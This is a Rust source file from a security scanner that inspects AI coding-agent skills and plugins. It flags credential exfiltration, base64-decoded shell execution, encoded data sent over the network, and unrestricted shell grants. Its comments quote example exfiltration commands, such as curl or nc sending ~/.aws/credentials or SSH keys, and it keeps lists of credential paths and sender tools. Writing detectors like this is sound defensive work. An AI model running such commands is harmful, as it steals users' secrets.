    let words = || lower.split(|c: char| c.is_whitespace() || matches!(c, ';' | '&' | '|' | '(' | '"' | '\''));
    // A URL's last path segment (`https://x/curl`) is not a program.
    let base = |w: &str| if w.contains("://") { String::new() } else { w.rsplit('/').next().unwrap_or(w).to_string() };
    let substitutes = lower.contains("$(") || lower.contains('`');
    if substitutes && words().any(|w| SENDERS.contains(&base(w).as_str())) {
        return true;
    }
    script_makes_request(&lower)
}

/// Path components (and component pairs) that name a credential store: AWS, SSH, the gh
/// and gcloud CLIs, netrc, npm/PyPI publish tokens, Docker and Kubernetes auth, `.env`
/// files, SSH private keys, and generic `credentials` / `token(s)` files.
const CREDENTIAL_COMPONENTS: &[&str] = &[
    ".aws", ".ssh", ".kube", ".netrc", "_netrc", ".npmrc", ".pypirc", ".env", ".git-credentials", "credentials",
    "credentials.json", "token", "tokens", "id_rsa", "id_ed25519", "id_ecdsa", "id_dsa",
];
const CREDENTIAL_COMPONENT_PAIRS: &[(&str, &str)] =
    &[(".config", "gh"), (".config", "gcloud"), (".docker", "config.json")];

/// True when a path-like run (`~/.aws/credentials`, `$home/.ssh/id_ed25519`, `.env`,
/// `./secrets/.env.production`) names a credential file or directory. Lowercase input.
fn is_credential_path(run: &str) -> bool {
    let comps: Vec<&str> = run.split('/').filter(|c| !c.is_empty()).collect();
    comps.iter().any(|c| CREDENTIAL_COMPONENTS.contains(c) || c.starts_with(".env."))
        || comps.windows(2).any(|w| CREDENTIAL_COMPONENT_PAIRS.contains(&(w[0], w[1])))
}

/// Shell words of one line as byte ranges: whitespace splits only outside quotes and
/// outside `$(...)` / backticks, so `"$(cat ~/.aws/credentials)"` is one word.
fn shell_word_ranges(line: &str) -> Vec<(usize, usize)> {
    let b = line.as_bytes();
    let mut out = Vec::new();
    let (mut single, mut double, mut tick, mut depth) = (false, false, false, 0usize);
    let mut start: Option<usize> = None;
    for (i, &c) in b.iter().enumerate() {
        let quiet = !single && !double && !tick && depth == 0;
        if quiet && c.is_ascii_whitespace() {
            if let Some(s) = start.take() {
                out.push((s, i));
            }
            continue;
        }
        start.get_or_insert(i);
        match c {
            b'\'' if !double && !tick && depth == 0 => single = !single,
            b'"' if !single => double = !double,
            b'`' if !single => tick = !tick,
            b'(' if !single && i > 0 && matches!(b[i - 1], b'$' | b'<' | b'>') => depth += 1,
            b'(' if depth > 0 => depth += 1,
            b')' if depth > 0 => depth -= 1,
            _ => {}
        }
    }
    if let Some(s) = start {
        out.push((s, b.len()));
    }
    out
}

/// A network sender (curl, wget, nc, socat, httpie, or a python/node/ruby one-liner that
/// makes a request) on the same line as a credential file it sends: read inside a
/// command or process substitution (`curl "https://x/?k=$(cat ~/.aws/credentials)"`,
/// `curl -d "$(< ~/.ssh/id_ed25519)"`), uploaded with `@` (`-d @~/.aws/credentials`,
/// `-F f=@~/.ssh/id_ed25519`, `--data-binary @.env`), redirected into it
/// (`nc host 443 < ~/.ssh/id_rsa`), named by `--post-file` / `--body-file` /
/// `--upload-file` / `-T`, placed in a URL's query, or named anywhere in an interpreter
/// one-liner that makes a request. Only the pipe forms (`cat key | curl -d @-`) were
/// caught before (review round 7). A token passed as a request HEADER
/// (`-H "Authorization: $(cat ~/.config/gh/token)"`) is how a credential helper
/// authenticates to its own service and is not counted.
pub fn sends_credential_file(text: &str) -> bool {
    text.lines().any(|line| line_sends_credential_file(&line.to_ascii_lowercase()))
}

fn line_sends_credential_file(line: &str) -> bool {
    let words: Vec<&str> = line
        .split(|c: char| c.is_whitespace() || matches!(c, ';' | '&' | '|' | '(' | '"' | '\'' | '`'))
        .filter(|w| !w.is_empty() && !w.contains("://"))
        .collect();
    let has_sender = words.iter().any(|w| SENDERS.contains(&w.rsplit('/').next().unwrap_or(w)));
    let script = script_makes_request(line);
    if !has_sender && !script {
        return false;
    }
    // Process substitution counts like command substitution (same byte length).
    let mask = substitution_mask(&line.replace("<(", "$(").replace(">(", "$("));
    let ranges = shell_word_ranges(line);
    let delim = |c: char| c.is_whitespace() || "\"'()<>@=?&,;:`|".contains(c);
    let unquote = |j: usize| line[ranges[j].0..ranges[j].1].trim_matches(['"', '\'']);
    // The nearest option before the current word, carried along so the walk stays linear
    // (a rescan of every earlier word per word was quadratic: a 900 KB hook module of
    // `curl x | sh; ` took over 40 s).
    let mut last_opt: Option<&str> = None;
    for (k, &(ws, we)) in ranges.iter().enumerate() {
        let word = &line[ws..we];
        let prev = k.checked_sub(1).map(unquote).unwrap_or("");
        let nearest_opt = last_opt;
        if unquote(k).starts_with('-') {
            last_opt = Some(unquote(k));
        }
        // A header value: the nearest option before this word is -H / --header. (Judged
        // on the nearest option, not the previous word, so it holds for de-quoted text
        // too, where `-H "Authorization: token $(cat x)"` is several words.)
        let bare = word.trim_start_matches(['"', '\'']);
        // curl's `-H @file` / `--header=@file` reads the headers from a file, so a
        // credential file there is sent (security review of b9cda85).
        let header_file = if matches!(prev, "-h" | "--header") && bare.starts_with('@') {
            Some(&bare[1..])
        } else {
            bare.strip_prefix("--header=@").or_else(|| bare.strip_prefix("-h@"))
        };
        if let Some(f) = header_file {
            if is_credential_path(f.trim_end_matches(['"', '\''])) {
                return true;
            }
            continue;
        }
        if nearest_opt.is_some_and(|w| matches!(w, "-h" | "--header")) {
            continue;
        }
        let file_flag = matches!(prev, "<" | "--post-file" | "--body-file" | "--upload-file" | "-t")
            || ["--post-file=", "--body-file=", "--upload-file="].iter().any(|f| bare.starts_with(f));
        // Path-like runs of the word with their byte offsets (char boundaries only).
        let mut runs: Vec<(usize, &str)> = Vec::new();
        let mut run_start: Option<usize> = None;
        for (i, c) in word.char_indices().chain(std::iter::once((word.len(), ' '))) {
            match (delim(c), run_start) {
                (true, Some(s0)) => {
                    runs.push((s0, &word[s0..i]));
                    run_start = None;
                }
                (false, None) => run_start = Some(i),
                _ => {}
            }
        }
        for (rel, run) in runs {
            let at = ws + rel;
            if !is_credential_path(run) {
                continue;
            }
            if script || file_flag || mask.get(at).copied().unwrap_or(false) {
                return true;
            }
            let before = word[..rel].trim_end_matches(['"', '\'']);
            if before.ends_with('@') || before.ends_with('<') || bare.starts_with('<') {
                return true;
            }
            if word.contains("://") && before.contains('?') {
                return true;
            }
        }
    }
    false
}

/// An interpreter one-liner (python, node, ruby, perl, ...) that makes an HTTP or socket
/// request.
fn script_makes_request(lower: &str) -> bool {
    lower
        .split(|c: char| c.is_whitespace() || matches!(c, ';' | '&' | '|' | '(' | '"' | '\''))
        .filter(|w| !w.contains("://"))
        .any(|w| SCRIPT_INTERPRETERS.contains(&w.rsplit('/').next().unwrap_or(w)))
        && SCRIPT_NET_MARKERS.iter().any(|m| lower.contains(m))
}

/// An interpreter one-liner that makes a network request carrying the environment or a
/// file it reads (`urlopen(... + os.environ['AWS_SECRET_ACCESS_KEY'])`, `fetch(...,
/// {body: process.env.X})`, `open('~/.ssh/id_rsa')`).
pub fn script_sends_local_data(cmd: &str) -> bool {
    let lower = cmd.to_ascii_lowercase();
    script_makes_request(&lower)
        && ["os.environ", "getenv", "process.env", "env[", "open(", "readfile", "file.read", "io.read"]
            .iter()
            .any(|m| lower.contains(m))
}

/// Pipeline stages, split on `|` (not `||`).
fn pipe_stages(cmd: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut cur = String::new();
    let chars: Vec<char> = cmd.chars().collect();
    let mut i = 0;
    while i < chars.len() {
        if chars[i] == '|' {
            if chars.get(i + 1) == Some(&'|') {
                cur.push_str("||");
                i += 2;
                continue;
            }
            out.push(std::mem::take(&mut cur));
        } else {
            cur.push(chars[i]);
        }
        i += 1;
    }
    out.push(cur);
    out
}

/// The program a pipeline stage runs: its first word, basename, wrappers skipped.
fn stage_program(stage: &str) -> String {
    stage
        .split_whitespace()
        .map(|w| w.trim_matches(['(', ')', '{', '}', '"', '\'', '&', ';']))
        .find(|w| !w.is_empty() && !matches!(*w, "sudo" | "exec" | "command" | "env" | "nohup") && !w.contains('='))
        .map(|w| w.rsplit('/').next().unwrap_or(w).to_string())
        .unwrap_or_default()
}

const INTERPRETERS: &[&str] =
    &["sh", "bash", "zsh", "dash", "ksh", "fish", "eval", "source", ".", "python", "python3", "perl", "node", "ruby", "php"];

fn is_b64_decode(s: &str) -> bool {
    ["base64 -d", "base64 --decode", "base64 -D", "base64 -di"].iter().any(|p| s.contains(p))
}

/// A base64 decode whose output a shell or interpreter executes: `... | base64 -d | sh`,
/// `eval "$(... | base64 -d)"`, `bash -c "$(... base64 -d)"`, `bash <(... base64 -d)`.
pub fn decodes_into_shell(cmd: &str) -> bool {
    let lower = cmd.to_ascii_lowercase();
    if !is_b64_decode(&lower) {
        return false;
    }
    let stages = pipe_stages(&lower);
    if let Some(i) = stages.iter().position(|s| is_b64_decode(s))
        && stages[i + 1..].iter().any(|s| INTERPRETERS.contains(&stage_program(s).as_str()))
    {
        return true;
    }
    let substitutes = lower.contains("$(") || lower.contains("<(") || lower.contains('`');
    let runs = lower.split(|c: char| c.is_whitespace() || c == ';' || c == '&' || c == '(').any(|w| matches!(w, "eval" | "source" | "."))
        || [" -c ", " -c\"", " -c'", "sh <(", "bash <("].iter().any(|p| lower.contains(p));
    substitutes && runs
}

const ENCODERS: &[&str] = &["base64", "xxd", "od -", "hexdump", "gzip", "openssl enc", "uuencode"];
const SENDERS: &[&str] = &["curl", "wget", "nc", "ncat", "socat", "telnet", "http", "xh"];

/// Encoded local data sent by a network client: an encoder stage piped into curl/wget/nc,
/// or a client whose arguments embed an encoder's output (`curl -d "$(... | base64)"`).
pub fn sends_encoded_data(cmd: &str) -> bool {
    let lower = cmd.to_ascii_lowercase();
    let stages = pipe_stages(&lower);
    if let Some(i) = stages.iter().position(|s| ENCODERS.iter().any(|e| s.contains(e)))
        && stages[i + 1..].iter().any(|s| SENDERS.contains(&stage_program(s).as_str()))
    {
        return true;
    }
    // Command substitutions inside a sender's arguments.
    let has_sender = lower
        .split(|c: char| c.is_whitespace() || c == ';' || c == '&' || c == '|' || c == '(')
        .any(|w| SENDERS.contains(&w.rsplit('/').next().unwrap_or(w)));
    if !has_sender {
        return false;
    }
    let inside = substitution_mask(&lower);
    ENCODERS
        .iter()
        .any(|e| lower.match_indices(e).any(|(i, _)| inside[i]))
}

/// For each byte of `s`: whether it lies inside a command substitution, `$( ... )`
/// (nesting and plain parentheses inside it counted, an unclosed one running to the
/// end) or `` `...` ``. One pass, one byte of memory per input byte: a file of nothing
/// but `$(` costs what its length costs. (An earlier version concatenated the rest of
/// the string once per `$(`, which is quadratic: an 80 KB skill took 1.5 GB.)
fn substitution_mask(s: &str) -> Vec<bool> {
    let b = s.as_bytes();
    let mut out = vec![false; b.len()];
    let mut depth = 0usize;
    let mut in_tick = false;
    let mut i = 0;
    while i < b.len() {
        match b[i] {
            b'$' if b.get(i + 1) == Some(&b'(') => {
                depth += 1;
                out[i] = true;
                out[i + 1] = true;
                i += 2;
                continue;
            }
            b'(' if depth > 0 => depth += 1,
            b')' if depth > 0 => depth -= 1,
            b'`' => in_tick = !in_tick,
            _ => {}
        }
        out[i] = depth > 0 || in_tick;
        i += 1;
    }
    out
}

/// JavaScript's `\s` (what Claude Code's lookbehind tests), which unlike Rust's
/// `char::is_whitespace` includes U+FEFF.
fn js_space(c: char) -> bool {
    c.is_whitespace() || c == '\u{feff}'
}

/// Claude Code's `dze`: blank the inside of every single-backtick code span
/// (`` /`[^`\n]+`/g ``, left to right, non-overlapping) unless the span is preceded by
/// `!` or a backtick, so an inline command quoted inside ordinary code is not run.
fn mask_code_spans(chars: &[char]) -> Vec<char> {
    let mut out = chars.to_vec();
    let n = chars.len();
    let mut i = 0;
    while i < n {
        if chars[i] != '`' {
            i += 1;
            continue;
        }
        let end = (i + 1..n).find(|&j| chars[j] == '`' || chars[j] == '\n');
        match end {
            Some(j) if chars[j] == '`' && j > i + 1 => {
                let prev = i.checked_sub(1).map(|k| chars[k]);
                if !matches!(prev, Some('!') | Some('`')) {
                    for c in &mut out[i + 1..j] {
                        *c = ' ';
                    }
                }
                i = j + 1;
            }
            _ => i += 1,
        }
    }
    out
}

/// Claude Code dynamic context injection, extracted the way Claude Code itself does
/// (`CEr` in the 2.1.308 bundle), so a skill cannot hide a command from this scan by
/// formatting it:
///
/// - blocks: `` /```!\s*\n?([\s\S]*?)\n?```/g `` over the raw text. Any ```` ```! ````
///   opens one, anywhere (inside another fence, mid-line, nested in a longer fence), and
///   the next ```` ``` ```` closes it. Tilde fences (`~~~!`) are not blocks.
/// - inline: `` /(?<=^|\s)!`([^`]+)`/gm `` over the text with single-backtick code spans
///   blanked (see [`mask_code_spans`]), so `` !`cmd` `` runs inside ordinary fenced
///   blocks, inside double-backtick spans and across line breaks, but not inside a
///   single-backtick span that is not itself preceded by `!`. `KEY=!`cmd`` and
///   `fuzz_target!`` are not matches: the `!` has to start a line or follow whitespace.
///
/// The body after the frontmatter is searched: Claude Code parses the frontmatter off
/// and runs the commands of the content it returns (`PEe(s.content, ...)`). Returns
/// `(command, block)` exactly as Claude Code would run them (trimmed, CRLF folded),
/// blocks first, at most 50. Documentation that shows the syntax inside a fence is
/// reported like a live command: Claude Code runs it too.
pub fn extract_dynamic_commands(text: &str) -> Vec<(String, bool)> {
    let mut out = Vec::new();
    let text = body_after_frontmatter(text);
    let chars: Vec<char> = text.chars().collect();
    let n = chars.len();
    let fence_at = |k: usize| k + 3 <= n && chars[k] == '`' && chars[k + 1] == '`' && chars[k + 2] == '`';
    let mut i = 0;
    while i + 4 <= n && out.len() < MAX_DYNAMIC_COMMANDS {
        if !(fence_at(i) && chars[i + 3] == '!') {
            i += 1;
            continue;
        }
        let mut start = i + 4;
        while start < n && js_space(chars[start]) {
            start += 1;
        }
        let Some(close) = (start..n).find(|&k| fence_at(k)) else {
            // No closing fence: no match here, and none later (a later ```! would itself
            // supply the closing fence for this one).
            break;
        };
        let end = if close > start && chars[close - 1] == '\n' { close - 1 } else { close };
        let cmd: String = chars[start..end.max(start)].iter().collect();
        let cmd = cmd.trim().replace("\r\n", "\n");
        if !cmd.is_empty() {
            out.push((cmd, true));
        }
        i = close + 3;
    }
    if text.contains("!`") {
        let masked = mask_code_spans(&chars);
        let mut i = 0;
        while i + 1 < n && out.len() < MAX_DYNAMIC_COMMANDS {
            let at_start = i == 0 || js_space(masked[i - 1]);
            if !(masked[i] == '!' && masked[i + 1] == '`' && at_start) {
                i += 1;
                continue;
            }
            match (i + 2..n).find(|&k| masked[k] == '`') {
                Some(close) if close > i + 2 => {
                    let cmd: String = masked[i + 2..close].iter().collect();
                    let cmd = cmd.trim().replace("\r\n", "\n");
                    if !cmd.is_empty() {
                        out.push((cmd, false));
                    }
                    i = close + 1;
                }
                _ => i += 1,
            }
        }
    }
    out.truncate(MAX_DYNAMIC_COMMANDS);
    out
}

/// Split an allowed-tools string on commas/whitespace outside parentheses.
fn tokenize_tools(s: &str, out: &mut Vec<String>) {
    let mut depth = 0i32;
    let mut cur = String::new();
    let flush = |cur: &mut String, out: &mut Vec<String>| {
        let t = cur.trim().trim_matches(|c| c == '[' || c == ']' || c == '"' || c == '\'').trim();
        if !t.is_empty() {
            out.push(t.to_string());
        }
        cur.clear();
    };
    for c in s.chars() {
        match c {
            '(' => {
                depth += 1;
                cur.push(c);
            }
            ')' => {
                depth -= 1;
                cur.push(c);
            }
            ',' | ' ' | '\t' | '\n' | '\r' if depth <= 0 => flush(&mut cur, out),
            _ => cur.push(c),
        }
    }
    flush(&mut cur, out);
}

/// The `allowed-tools` frontmatter value as tool tokens. Accepts a string
/// (`Bash Read`, `Bash, Read`), a YAML sequence, or (when the YAML does not parse) the
/// scalar after `allowed-tools:` on its own line.
pub fn parse_allowed_tools(frontmatter: &str) -> Vec<String> {
    let mut out = Vec::new();
    if frontmatter.len() > MAX_FRONTMATTER {
        return out;
    }
    match serde_yaml_ng::from_str::<serde_yaml_ng::Value>(frontmatter) {
        Ok(v) => {
            let Some(val) = v.get("allowed-tools") else { return out };
            match val {
                serde_yaml_ng::Value::String(s) => tokenize_tools(s, &mut out),
                serde_yaml_ng::Value::Sequence(seq) => {
                    for item in seq {
                        if let Some(s) = item.as_str() {
                            tokenize_tools(s, &mut out);
                        }
                    }
                }
                _ => {}
            }
        }
        Err(_) => {
            for line in frontmatter.lines() {
                if let Some(rest) = line.trim_start().strip_prefix("allowed-tools:") {
                    tokenize_tools(rest, &mut out);
                    break;
                }
            }
        }
    }
    out
}

/// True if any token pre-approves every shell command. Claude Code's permissions docs:
/// `Bash(*)` is equivalent to `Bash`. Scoped forms (`Bash(git diff:*)`) are not.
pub fn grants_unrestricted_shell(tokens: &[String]) -> bool {
    tokens.iter().any(|t| {
        let t = t.replace(' ', "");
        matches!(t.as_str(), "Bash" | "Bash(*)" | "Bash(**)" | "PowerShell" | "PowerShell(*)")
    })
}

fn extract_project_dirs(claude_json: &Path) -> Option<Vec<PathBuf>> {
    let content = read_bounded(claude_json)?;
    let parsed: serde_json::Value = serde_json::from_str(&content).ok()?;
    let projects = parsed.get("projects")?.as_object()?;
    let dirs: Vec<PathBuf> = projects
        .keys()
        .map(PathBuf::from)
        .filter(|p| crate::scanners::probe_dir(p))
        .collect();
    if dirs.is_empty() {
        None
    } else {
        Some(dirs)
    }
}

fn sha256_hex(content: &str) -> String {
    super::sha256_hex(content)
}

/// Infer capability categories from skill content.
/// Based on the 8-resource taxonomy from SkillFortify (arXiv:2603.00195).
pub fn infer_capabilities(content: &str) -> Vec<String> {
    let lower = content.to_lowercase();
    let mut caps = Vec::new();

    // filesystem: file operations, path references
    if lower.contains("read_file")
        || lower.contains("write_file")
        || lower.contains("readfile")
        || lower.contains("writefile")
        || lower.contains("fs.")
        || lower.contains("open(")
        || lower.contains("std::fs")
        || lower.contains("pathbuf")
    {
        caps.push("filesystem".to_string());
    }

    // network: HTTP, URLs, fetch, curl
    if lower.contains("http")
        || lower.contains("fetch")
        || lower.contains("curl")
        || lower.contains("wget")
        || lower.contains("request")
        || lower.contains("socket")
        || lower.contains("tcp")
        || lower.contains("udp")
    {
        caps.push("network".to_string());
    }

    // environment: env vars, secrets
    if lower.contains("env.")
        || lower.contains("getenv")
        || lower.contains("process.env")
        || lower.contains("os.environ")
        || lower.contains("env::")
        || lower.contains("api_key")
        || lower.contains("secret")
    {
        caps.push("environment".to_string());
    }

    // shell: command execution
    if lower.contains("bash")
        || lower.contains("subprocess")
        || lower.contains("os.system")
        || lower.contains("child_process")
        || lower.contains("exec(")
        || lower.contains("system(")
        || lower.contains("popen")
        || lower.contains("command::new")
    {
        caps.push("shell".to_string());
    }

    // skill_invoke: calling other skills/tools
    if lower.contains("tool_use")
        || lower.contains("mcp")
        || lower.contains("invoke")
        || lower.contains("call_tool")
        || lower.contains("use_mcp_tool")
    {
        caps.push("skill_invoke".to_string());
    }

    // clipboard: clipboard access
    if lower.contains("clipboard")
        || lower.contains("pbcopy")
        || lower.contains("pbpaste")
        || lower.contains("xclip")
        || lower.contains("xsel")
    {
        caps.push("clipboard".to_string());
    }

    // browser: browser automation
    if lower.contains("playwright")
        || lower.contains("puppeteer")
        || lower.contains("selenium")
        || lower.contains("browser")
        || lower.contains("headless")
    {
        caps.push("browser".to_string());
    }

    // database: DB access
    if lower.contains("database")
        || lower.contains("sqlite")
        || lower.contains("postgres")
        || lower.contains("mysql")
        || lower.contains("mongodb")
        || lower.contains("redis")
        || lower.contains("select ")
        || lower.contains("insert into")
    {
        caps.push("database".to_string());
    }

    caps
}

#[cfg(test)]
mod tests {
    use super::*;

    fn resolutions() -> usize {
        RESOLUTIONS.with(|c| c.get())
    }

    /// The plugins walk resolves paths O(directories), not O(files): 200 files in 4
    /// skill directories of one installed plugin. Before the per-scan [`ScanPaths`] and
    /// the per-walk [`WalkCache`] every file re-resolved HOME, the ~60 skill areas, its
    /// own path and its containment and plugin roots (over 12,000 `canonicalize` calls
    /// here, 600,000 `readlink`s on a real 2,400-file plugin tree).
    #[test]
    fn plugin_walk_resolves_per_directory_not_per_file() {
        let base = std::env::temp_dir().join(format!("rmg-skills-resolve-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&base);
        let home = base.join("home");
        let plugins = home.join(".claude").join("plugins");
        let version = plugins.join("cache").join("m").join("p").join("1.0");
        for d in 0..4 {
            let dir = version.join("skills").join(format!("s{d}"));
            std::fs::create_dir_all(&dir).unwrap();
            std::fs::write(dir.join("SKILL.md"), "---\nname: s\n---\nbody\n").unwrap();
            for f in 0..49 {
                std::fs::write(dir.join(format!("f{f}.sh")), format!("echo {f}\n")).unwrap();
            }
        }
        let ctx = PluginContext::load(&home);
        // The per-scan constants are resolved once (about 60 calls) and not counted here.
        let _ = ctx.paths();

        let before = resolutions();
        let mut results = Vec::new();
        scan_skill_bundles(&plugins, "claude-code-plugin", "global", None, &ctx, &mut results);
        let walk = resolutions() - before;
        assert_eq!(results.len(), 200);
        assert!(results.iter().all(|r| r.sha256.len() == 64), "every file read and hashed");
        assert!(walk < 40, "200 files in 4 directories resolved {walk} times");

        let before = resolutions();
        dedupe_results(&mut results);
        let dedupe = resolutions() - before;
        assert_eq!(results.len(), 200);
        assert!(dedupe < 40, "deduping 200 entries in 4 directories resolved {dedupe} times");

        let _ = std::fs::remove_dir_all(&base);
    }
}
